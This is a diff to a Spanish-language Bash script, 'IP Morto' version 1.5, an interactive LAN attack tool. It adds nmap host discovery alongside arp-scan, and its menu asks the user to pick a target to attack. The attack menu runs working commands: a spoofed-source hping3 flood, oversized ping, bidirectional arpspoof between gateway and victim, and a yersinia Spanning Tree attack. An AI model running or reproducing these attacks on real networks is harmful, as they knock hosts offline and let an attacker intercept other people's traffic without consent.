@@ -16,25 +16,38 @@
 #                                                               #
 #################################################################
 
-rm -R /tmp/ip_morto 2>/dev/null 
-mkdir /tmp/ip_morto 2>/dev/null 
+
+#################################################################
+##########################Cambios################################
+#################################################################
+#																#
+#version 1.5                                                    #
+#																#
+#Se añadido nmap a la busqueda de ip							#
+#																#
+#################################################################
+
+rm -R /tmp/ip-morto 2>/dev/null 
+mkdir /tmp/ip-morto 2>/dev/null 
 
 
 Titulo(){
 	
 clear
 echo -e "\e[0;31m
- _________ _______    _______  _______  _______ _________ _______ 
- \__   __/(  ____ )  (       )(  ___  )(  ____ )\__   __/(  ___  )
-    ) (   | (    )|  | () () || (   ) || (    )|   ) (   | (   ) |
-    | |   | (____)|  | || || || |   | || (____)|   | |   | |   | |
-    | |   |  _____)  | |(_)| || |   | ||     __)   | |   | |   | |
-    | |   | (        | |   | || |   | || (\ (      | |   | |   | |
- ___) (___| )        | )   ( || (___) || ) \ \__   | |   | (___) |
- \_______/|/         |/     \|(_______)|/   \__/   )_(   (_______)
+  _________ _______    _______  _______  _______ _________ _______ 
+  \__   __/(  ____ )  (       )(  ___  )(  ____ )\__   __/(  ___  )
+     ) (   | (    )|  | () () || (   ) || (    )|   ) (   | (   ) |
+     | |   | (____)|  | || || || |   | || (____)|   | |   | |   | |
+     | |   |  _____)  | |(_)| || |   | ||     __)   | |   | |   | |
+     | |   | (        | |   | || |   | || (\ (      | |   | |   | |
+  ___) (___| )        | )   ( || (___) || ) \ \__   | |   | (___) |
+  \_______/|/         |/     \|(_______)|/   \__/   )_(   (_______)
                                                                  
 "
 echo 
+echo -e "\e[0;31m 			version 1.5"
+echo
 tput sgr0
 sleep 0.5
 
@@ -42,7 +55,7 @@ sleep 0.5
 
 Comprobacion(){
 	
-echo -en "\e[0;32m hping3....."
+echo -en "\e[0;32m hping3......."
 if ! hash hping3 2>/dev/null ; then
 	echo -e "\e[0;37m No esta instalado"
 	exit 0
@@ -51,7 +64,7 @@ else
 fi
 sleep 0.2
 
-echo -en "\e[0;32m ping....."
+echo -en "\e[0;32m ping........."
 if ! hash ping 2>/dev/null ; then
 	echo -e "\e[0;37m No esta instalado"
 	exit 0
@@ -88,14 +101,14 @@ fi
 sleep 0.2
 
 echo
-echo -en "\e[0;32m Escriba .exit para salir del programa"
+echo -en "\e[0;37m Escriba .exit para salir del programa"
 echo 
-echo -en "\e[0;32m Si desa repetir la busqueda escriba .repit"
+echo -en "\e[0;37m Si desa repetir la busqueda escriba .repit"
 echo
-echo -en "\e[0;32m Presione enter para continuar " && read enter
+echo -en "\e[0;32m Presione enter para continuar\e[0;37m  " && read enter
 
 case $enter in
-	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
+	.exit) echo; echo -e "\e[0;37m Saliendo del programa"; rm -R /tmp/ip-morto 2>/dev/null; sleep 03; clear; exit 0;;
 esac
 
 }
@@ -105,36 +118,58 @@ Interfaz(){
 clear
 Titulo
 
-rm -rf /tmp/ip_morto/Interfaz 2>/dev/null
+rm -rf /tmp/ip-morto/Interfaz 2>/dev/null
 
-Inter=$( ip link show | grep ^[0-9] | grep -v lo | cut -f2 -d":"| sed 's/^[ \t]*//' >> /tmp/ip_morto/Interfaz 2>/dev/null )
+Inter=$( ip link show | grep ^[0-9] | grep -v lo | cut -f2 -d":"| sed 's/^[ \t]*//' > /tmp/ip-morto/Interfaz 2>/dev/null )
 
 count=0 
 while read Inter; do 
 	count=$((++count)) 
 	echo -e "\e[0;31m $count \e[0;37m $Inter" 
-done < /tmp/ip_morto/Interfaz
+done < /tmp/ip-morto/Interfaz
 
 echo
-echo -en "\e[0;32m Seleccione el numero de la interfaz a auditar\e[0;31m => " && read interfaz
+echo -en "\e[0;32m Seleccione el numero de la interfaz a auditar\e[0;31m =>\e[0;37m " && read interfaz
 
 case $interfaz in
-	[1-2]) INTER=$( head -$interfaz /tmp/ip_morto/Interfaz | tail -1 ); echo; echo  " A seleccionado $INTER"; sleep 02; clear; Titulo; Busqueda;;
-	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
-	*[^$count]*|"") echo  "Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear, Titulo; Interfaz;;
+	[1-2]) INTER=$( head -$interfaz /tmp/ip-morto/Interfaz | tail -1 ); echo; echo  " A seleccionado $INTER"; sleep 02; clear; Titulo; Busqueda;;
+	.exit) echo; echo " Saliendo del programa"; rm -R /tmp/ip-morto 2>/dev/null; sleep 03; clear; exit 0;;
+	*[^$count]*|"") echo; echo  " Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Interfaz;;
 esac
 
 }
 
 Busqueda(){
-	
-rm -rf /tmp/ip_morto/scan 2>/dev/null 
+
+rm -rf /tmp/ip-morto/objetivo 2>/dev/null
+rm -rf /tmp/ip-morto/objetivos 2>/dev/null 
+rm -rf /tmp/ip-morto/arp 2>/dev/null 
+rm -rf /tmp/ip-morto/nmap 2>/dev/null 
+rm -rf /tmp/ip-morto/so 2>/dev/null
+rm -rf /tmp/ip-morto/list 2>/dev/null
+
+echo -en " \e[0;31m1 \e[0;37m nmap"
+echo
+echo -en " \e[0;31m2 \e[0;37m arp-scan"
+echo
+echo
+echo -en "\e[0;32m Seleccione el metodo de busqueda\e[0;31m =>\e[0;37m " && read busqueda
+
+case $busqueda in
+	1) echo; echo " A seleccionado nmap"; sleep 02; nmap -sP -PR 192.168.0/21 2>/dev/null > /tmp/ip-morto/nmap; grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}|((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' /tmp/ip-morto/nmap > /tmp/ip-morto/list && awk 'ORS=NR%2?FS:RS' /tmp/ip-morto/list > /tmp/ip-morto/lista | grep -oP "(?<=for )[^ ]+" /tmp/ip-morto/nmap > /tmp/ip-morto/so; ip=$( awk "{ print $1 }" /tmp/ip-morto/lista ); mac=$( awk "{ print $2 }" /tmp/ip-morto/lista ); so=$( awk "{ print $1 }" /tmp/ip-morto/so ) 2>/dev/null; paste -d " " /tmp/ip-morto/lista /tmp/ip-morto/so > /tmp/ip-morto/objetivo;;
+	2) echo; echo " A seleccionado arp-scan"; sleep 02; arp-scan --interface=$INTER --localnet 2>/dev/null > /tmp/ip-morto/arp; sed -e '1,2d' -e '/packets/d' -e '/Ending/d' -e '/^$/d' /tmp/ip-morto/arp > /tmp/ip-morto/objetivo 2>/dev/null;;
+	.exit) echo; echo " Saliendo del programa"; rm -R /tmp/ip-morto 2>/dev/null; sleep 03; clear; exit 0;;
+	*[^$count]*|"") echo; echo  " Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Busqueda;;
+esac
+
+clear
+Titulo
 
 echo " Buscando conexiones puede tardar un poco"
-
-arp-scan --interface=$INTER --localnet 2>/dev/null >> /tmp/ip_morto/scan
+sleep 02
 
 Objetivos
+
 }
 
 Objetivos(){
@@ -142,17 +177,14 @@ Objetivos(){
 clear
 Titulo
 
-rm -rf /tmp/ip_morto/objetivos 2>/dev/null 
+obj=$( column -t /tmp/ip-morto/objetivo >> /tmp/ip-morto/objetivos )
 
-sed -e '1,2d' -e '/packets/d' -e '/Ending/d' -e '/^$/d' /tmp/ip_morto/scan >> /tmp/ip_morto/objetivos
-obj=$( cat /tmp/ip_morto/objetivos )
-
-if [ -s /tmp/ip_morto/objetivos ]; then
+if [ -s /tmp/ip-morto/objetivos ]; then
 		count=0 
 	while read obj; do 
 		count=$((++count)) 
 		echo -e "\e[0;31m $count \e[0;37m $obj" 
-	done < /tmp/ip_morto/objetivos
+	done < /tmp/ip-morto/objetivos
 else
 	echo -en " La interfaz seleccionada no esta conectada, o da un error. Repita el proceso "
 	sleep 03
@@ -162,43 +194,43 @@ else
 fi
 
 echo
-echo -en "\e[0;32m Seleccione el objetivo a atacar\e[0;31m => " && read objetivo
+echo -en "\e[0;32m Seleccione el objetivo a atacar\e[0;31m =>\e[0;37m " && read objetivo
 
 
 case $objetivo in
-	[1-99]) obje=$( head -$objetivo /tmp/ip_morto/objetivos | tail -1 ); echo; echo " A seleccionado $obje"; sleep 02; clear; Titulo; Ataque;;
-	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
-	.repit) clear; Titulo; Busqueda; Objetivos;;
-	*[^$count]*|"") echo  "Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Objetivos;;
+	[1-99]) obje=$( head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $1 }' ); echo; echo " A seleccionado $obje"; sleep 02; clear; Titulo; Ataque;;
+	.exit) echo; echo " Saliendo del programa"; rm -R /tmp/ip-morto 2>/dev/null; sleep 03; clear; exit 0;;
+	.repit) clear; Titulo; Busqueda;;
+	*[^$count]*|"") echo; echo  " Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Objetivos;;
 esac
 
 }
 
 Ataque(){
 
-IP=$( head -$objetivo /tmp/ip_morto/objetivos | tail -1 | awk '{ print $1 }' )
-Gate=$( ip route show | grep default | awk {'print $3'} )
-INTER=$( head -$interfaz /tmp/ip_morto/Interfaz | tail -1 )
-MAC=$( head -$objetivo /tmp/ip_morto/objetivos | tail -1 | awk '{ print $2 }' )
+IP=$( head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $1 }' 2>/dev/null )
+Gate=$( ip route show | grep default | awk {'print $3'} 2>/dev/null  )
+INTER=$( head -$interfaz /tmp/ip-morto/Interfaz | tail -1 2>/dev/null  )
+MAC=$( head -$objetivo /tmp/ip-morto/objetivos | tail -1 | awk '{ print $2 }' 2>/dev/null  )
 
-echo -en " 1) \e[0;32m Hping3"
+echo -en " \e[0;31m1) \e[0;37m Hping3"
 echo
-echo -en " 2) \e[0;32m Ping"
+echo -en " \e[0;31m2) \e[0;37m Ping"
 echo
-echo -en " 3) \e[0;32m Arp Spoof (efectivo)"
+echo -en " \e[0;31m3) \e[0;37m Arp Spoof (efectivo)"
 echo
-echo -en " 4) \e[0;32m Spanning Tree Protocol (efectivo)"
+echo -en " \e[0;31m4) \e[0;37m Spanning Tree Protocol (efectivo)"
 echo
 echo
-echo -en "\e[0;32m Seleccione el metodo de ataque\e[0;31m => " && read objetivo
+echo -en "\e[0;32m Seleccione el metodo de ataque\e[0;31m =>\e[0;37m " && read ataque
 
-case $objetivo in
+case $ataque in
 	1) hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP & sleep 02 & hping3 --flood --rand-source $IP; sleep 03; clear; Titulo; Ataque;;
 	2) ping $IP -t -l 15000; sleep 03; clear; Titulo; Ataque;;
 	3) xterm -e arpspoof -i $INTER -t $Gate $IP & sleep 05 & xterm -e arpspoof -i $INTER -t $IP $Gate; sleep 03; clear; Titulo; Ataque;;
 	4) yersinia  stp -attack 3 -interface $INTER -source $MAC; sleep 03; clear; Titulo; Ataque;;
-	.exit) echo; echo " Saliendo del programa"; sleep 03; clear; exit 0;;
-	*[^$count]*|"") echo  "Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Ataque;;
+	.exit) echo; echo " Saliendo del programa"; rm -R /tmp/ip-morto 2>/dev/null; sleep 03; clear; exit 0;;
+	*[^$count]*|"") echo; echo  " Ingrese un formato válido! Sólo los números que salen listados!"; sleep 03; clear; Titulo; Ataque;;
 esac
 
 }
@@ -206,3 +238,4 @@ esac
 Titulo
 Comprobacion
 Interfaz
+
